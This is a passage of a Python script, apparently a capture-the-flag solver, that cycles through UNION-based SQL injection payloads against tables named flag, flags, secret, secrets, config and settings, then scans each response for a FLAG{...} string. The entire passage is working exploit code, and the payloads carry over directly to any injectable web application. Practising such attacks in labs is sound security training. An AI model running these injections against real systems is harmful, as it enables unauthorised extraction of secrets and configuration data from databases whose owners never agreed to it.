flag_found = False
flag_value = None

def check_for_flag(text):
    """Check if text contains a flag pattern"""
    flag_match = re.search(r'FLAG\{[^}]+\}', text, re.IGNORECASE)
    if flag_match:
        return flag_match.group(0)
    return None

# Try to extract from flag table
test_queries = [
    ("flag table", "test' UNION SELECT * FROM flag-- "),
    ("flags table", "test' UNION SELECT * FROM flags-- "),
    ("secret table", "test' UNION SELECT * FROM secret-- "),
    ("secrets table", "test' UNION SELECT * FROM secrets-- "),
    ("config table", "test' UNION SELECT * FROM config-- "),
    ("settings table", "test' UNION SELECT * FROM settings-- "),
]

for name, query in test_queries:
    print(f"\n[+] Trying to extract from {name}...")
    response = send_payload(query)
    
    if response and response.status_code == 200:
        data = extract_data(response)
        
        # Check for flag in response
        flag = check_for_flag(response.text)
        if flag:
            print(f"[!] FLAG FOUND: {flag}")
            flag_found = True
            flag_value = flag
            break
    time.sleep(0.5)

